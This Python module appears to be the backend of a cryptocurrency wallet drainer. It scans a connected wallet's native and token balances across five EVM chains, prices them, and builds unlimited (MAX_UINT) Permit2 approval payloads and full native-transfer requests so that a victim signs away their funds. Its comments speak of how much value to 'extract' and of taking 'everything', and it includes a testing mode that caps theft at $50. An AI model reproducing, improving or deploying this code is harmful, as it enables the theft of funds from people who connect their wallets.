# services/wallet_scanner.py

import asyncio
import aiohttp
import os
from web3 import Web3
from dotenv import load_dotenv
from tenacity import retry, stop_after_attempt, wait_fixed
from django.http import JsonResponse
import time
from django.conf import settings


load_dotenv()


ENV = "testnet"

if not (settings.DEBUG == False):
    ENV = "mainnet"


NETWORKS = {
    "Ethereum": {
        "mainnet": {
            "rpc": os.getenv("ETH_RPC"),
            "chain_id": 1
        },
        "testnet": {
            "rpc": os.getenv("ETH_RPC_TEST"),
            "chain_id": 11155111
        }
    },
    "BSC": {
        "mainnet": {
            "rpc": os.getenv("BSC_RPC"),
            "chain_id": 56
        },
        "testnet": {
            "rpc": os.getenv("BSC_RPC_TEST"),
            "chain_id": 97
        }
    },
    "Polygon": {
        "mainnet": {
            "rpc": os.getenv("POLYGON_RPC"),
            "chain_id": 137
        },
        "testnet": {
            "rpc": os.getenv("POLYGON_RPC_TEST"),
            "chain_id": 80002
        }
    },
    "Arbitrum": {
        "mainnet": {
            "rpc": os.getenv("ARB_RPC"),
            "chain_id": 42161
        },
        "testnet": {
            "rpc": os.getenv("ARB_RPC_TEST"),
            "chain_id": 421614
        }
    },
    "Optimism": {
        "mainnet": {
            "rpc": os.getenv("OPT_RPC"),
            "chain_id": 10
        },
        "testnet": {
            "rpc": os.getenv("OPT_RPC_TEST"),
            "chain_id": 11155420
        }
    }
}

CHAINS = [
    {
        "name": name,
        "rpc": data[ENV]["rpc"],
        "chain_id": data[ENV]["chain_id"]
    }
    for name, data in NETWORKS.items()
]




# utils/filters.py

def is_spam_token(symbol):
    if not symbol:
        return True

    s = symbol.lower()

    spam_keywords = [
        "http", "www", ".com", ".org", ".info",
        "claim", "reward", "airdrop", "visit",
        "bonus", "eligible", ".io", "test"
    ]

    return any(word in s for word in spam_keywords) or len(s) > 15




# utils/payloads.py

PERMIT2_ADDRESS = Web3.to_checksum_address(
    "0x000000000022d473030f116ddee9f6b43ac78ba3"
)

def build_permit2_payload(tokens):
    MAX_UINT = int("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", 16)

    return [
        {
            "token": t["contract"],
            "symbol": t["symbol"],
            "amount": str(MAX_UINT),
            "spender": PERMIT2_ADDRESS,
            "type": "erc20"
        }
        for t in tokens
    ]


def build_native_transfer(chain_name, balance):
    return {
        "type": "native",
        "chain": chain_name,
        "amount": format(balance, ".8f")
    }


MINIMUM_USD_THRESHOLD = 0.01

# =========================
# TESTING MODE CONFIG
# =========================
TESTING_MODE = False           # Change to False to resume normal flow
TEST_TOTAL_USD_LIMIT = 50.0   # The maximum USD value to extract across all chains

# Maps your internal chain names to DeFiLlama's chain prefixes
LLAMA_CHAIN_MAP = {
    "Ethereum": "ethereum",
    "BSC": "bsc",
    "Polygon": "polygon",
    "Arbitrum": "arbitrum",
    "Optimism": "optimism"
}


# Maps your internal chain names to their CoinGecko ID for DeFiLlama
NATIVE_COIN_MAP = {
    "Ethereum": "coingecko:ethereum",
    "BSC": "coingecko:binancecoin",
    "Polygon": "coingecko:matic-network",
    "Arbitrum": "coingecko:ethereum",  # Arbitrum uses ETH for gas
    "Optimism": "coingecko:ethereum"   # Optimism uses ETH for gas
}

@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
async def fetch_native_price(session, chain_name):
    """Fetches the USD price of the native gas token."""
    coin_id = NATIVE_COIN_MAP.get(chain_name)
    if not coin_id:
        return 0.0

    url = f"https://coins.llama.fi/prices/current/{coin_id}"
    
    try:
        async with session.get(url) as res:
            data = await res.json()
            print(data.get("coins", {}).get(coin_id, {}).get("price", 0.0))
            return data.get("coins", {}).get(coin_id, {}).get("price", 0.0)
    except Exception as e:
        print(f"Error fetching native price for {chain_name}: {e}")
        return 0.0
    

@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
async def fetch_token_prices(session, chain_name, contracts):
    """Fetches USD prices for a list of token contracts in bulk."""
    if not contracts:
        return {}
        
    llama_chain = LLAMA_CHAIN_MAP.get(chain_name)
    if not llama_chain:
        return {}

    # Format for DeFiLlama: chain:address,chain:address
    coins = ",".join([f"{llama_chain}:{addr.lower()}" for addr in contracts])
    url = f"https://coins.llama.fi/prices/current/{coins}"
    
    try:
        async with session.get(url) as res:
            data = await res.json()
            prices = {}
            for coin_key, coin_data in data.get("coins", {}).items():
                # Extract just the address from the "chain:address" string
                addr = coin_key.split(":")[1].lower()
                prices[addr] = coin_data.get("price", 0)
            print(prices)
            return prices
    except Exception as e:
        print(f"Error fetching prices for {chain_name}: {e}")
        return {}


@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
async def fetch_token_balances(session, url, wallet):
    payload = {
        "jsonrpc": "2.0",
        "method": "alchemy_getTokenBalances",
        "params": [wallet],
        "id": 1,
    }
    async with session.post(url, json=payload) as res:
        return await res.json()


@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
async def fetch_token_metadata(session, url, contract):
    payload = {
        "jsonrpc": "2.0",
        "method": "alchemy_getTokenMetadata",
        "params": [contract],
        "id": 1,
    }
    async with session.post(url, json=payload) as res:
        return await res.json()


async def get_native_balance(w3, wallet):
    balance_wei = w3.eth.get_balance(wallet)
    return float(w3.from_wei(balance_wei, 'ether'))


# WITHOUT THE THRESHHOLD FUNCTIONALITY
# async def get_chain_data(chain, wallet):
#     try:
#         w3 = Web3(Web3.HTTPProvider(chain["rpc"]))

#         async with aiohttp.ClientSession() as session:

#             native_balance = await get_native_balance(w3, wallet)

#             native_transfer = None
#             if native_balance > 0:
#                 native_transfer = build_native_transfer(
#                     chain["name"], round(native_balance, 8)
#                 )

#             token_data = await fetch_token_balances(session, chain["rpc"], wallet)

#             tokens = []
#             token_list = token_data.get("result", {}).get("tokenBalances", [])

#             for token in token_list:
#                 if token["tokenBalance"] == "0x0":
#                     continue

#                 contract = token["contractAddress"]

#                 metadata = await fetch_token_metadata(session, chain["rpc"], contract)
#                 meta = metadata.get("result", {})

#                 symbol = meta.get("symbol", "")
#                 decimals = meta.get("decimals", 18)

#                 if is_spam_token(symbol):
#                     continue

#                 try:
#                     raw_balance = int(token["tokenBalance"], 16)
#                     balance = raw_balance / (10 ** decimals)
#                 except:
#                     continue

#                 if balance <= 0:
#                     continue

#                 tokens.append({
#                     "symbol": symbol,
#                     "balance": round(balance, 6),
#                     "contract": contract
#                 })

#             return {
#                 "chain": chain["name"],
#                 "native_balance": round(native_balance, 8),
#                 "native_transfer": native_transfer,
#                 "tokens": tokens,
#                 "permit2": build_permit2_payload(tokens),
#                 "has_funds": native_balance > 0 or len(tokens) > 0
#             }

#     except Exception as e:
#         print(f"Error on {chain['name']}: {e}")
#         return None



# WITH THE THRESHHOLD FUNCTIONALITY
async def get_chain_data(chain, wallet, remaining_usd):
    try:
        w3 = Web3(Web3.HTTPProvider(chain["rpc"]))
        used_usd = 0.0 # Track how much value we extract from this specific chain

        async with aiohttp.ClientSession() as session:
            # --- NATIVE COIN FILTERING ---
            native_balance = await get_native_balance(w3, wallet)
            native_transfer = None
            
            if native_balance > 0:
                native_price = await fetch_native_price(session, chain["name"])
                native_usd_value = native_balance * native_price
                
                if native_usd_value >= MINIMUM_USD_THRESHOLD:
                    amount_to_take = native_balance
                    usd_to_take = native_usd_value

                    # Apply testing logic cap
                    if TESTING_MODE:
                        if used_usd >= remaining_usd:
                            amount_to_take = 0
                        elif used_usd + native_usd_value > remaining_usd:
                            allowed_usd = remaining_usd - used_usd
                            # Take only the fraction needed to hit the limit
                            amount_to_take = native_balance * (allowed_usd / native_usd_value)
                            usd_to_take = allowed_usd
                    
                    if amount_to_take > 0 and usd_to_take >= MINIMUM_USD_THRESHOLD:
                        used_usd += usd_to_take
                        native_transfer = build_native_transfer(
                            chain["name"], round(amount_to_take, 8)
                        )

            # --- ERC20 TOKEN FILTERING ---
            token_data = await fetch_token_balances(session, chain["rpc"], wallet)
            
            preliminary_tokens = []
            contracts_to_price = []
            
            token_list = token_data.get("result", {}).get("tokenBalances", [])

            for token in token_list:
                if token["tokenBalance"] == "0x0":
                    continue

                contract = token["contractAddress"]
                metadata = await fetch_token_metadata(session, chain["rpc"], contract)
                meta = metadata.get("result", {})

                symbol = meta.get("symbol", "")
                decimals = meta.get("decimals", 18)

                if is_spam_token(symbol):
                    continue

                try:
                    raw_balance = int(token["tokenBalance"], 16)
                    balance = raw_balance / (10 ** decimals)
                except:
                    continue

                if balance <= 0:
                    continue

                preliminary_tokens.append({
                    "symbol": symbol,
                    "balance": balance,
                    "contract": contract
                })
                contracts_to_price.append(contract)

            prices = await fetch_token_prices(session, chain["name"], contracts_to_price)
            
            tokens = []
            for pt in preliminary_tokens:
                price = prices.get(pt["contract"].lower(), 0)
                usd_value = pt["balance"] * price
                
                if usd_value >= MINIMUM_USD_THRESHOLD:
                    amount_to_take = pt["balance"]
                    usd_to_take = usd_value

                    # Apply testing logic cap
                    if TESTING_MODE:
                        if used_usd >= remaining_usd:
                            continue  # We hit the limit, skip evaluating further tokens
                        elif used_usd + usd_value > remaining_usd:
                            allowed_usd = remaining_usd - used_usd
                            # Take only the fraction needed to hit the limit
                            amount_to_take = pt["balance"] * (allowed_usd / usd_value)
                            usd_to_take = allowed_usd
                    
                    if amount_to_take > 0 and usd_to_take >= MINIMUM_USD_THRESHOLD:
                        used_usd += usd_to_take
                        tokens.append({
                            "symbol": pt["symbol"],
                            "balance": round(amount_to_take, 6), # Frontend receives this partial balance
                            "contract": pt["contract"],
                        })

            has_valid_funds = (native_transfer is not None) or (len(tokens) > 0)

            # Note: We now return a tuple containing the payload AND the usd extracted
            return {
                "chain": chain["name"],
                "native_balance": round(native_balance, 8),
                "native_transfer": native_transfer,
                "tokens": tokens,
                "permit2": build_permit2_payload(tokens),
                "has_funds": has_valid_funds
            }, used_usd

    except Exception as e:
        print(f"Error on {chain['name']}: {e}")
        return None, 0.0


async def scan_wallet(wallet):
    results = []
    
    if TESTING_MODE:
        # 🧪 TEST FLOW: Process chains sequentially to track exact $50 global limit
        remaining_usd = TEST_TOTAL_USD_LIMIT
        for chain in CHAINS:
            if remaining_usd <= 0:
                break # We reached $50, stop scanning chains
                
            data, used_usd = await get_chain_data(chain, wallet, remaining_usd)
            remaining_usd -= used_usd # Deduct what was extracted on this chain
            
            if data and data["has_funds"]:
                results.append(data)
    else:
        # 🚀 NORMAL FLOW: Process concurrently for speed (No Limits)
        # We pass float('inf') as the remaining limit so it takes everything
        tasks = [get_chain_data(chain, wallet, float('inf')) for chain in CHAINS]
        responses = await asyncio.gather(*tasks)
        
        # Responses are tuples of (data_dict, used_usd), so we extract the dict at index 0
        results = [r[0] for r in responses if r[0] and r[0]["has_funds"]]

    return results
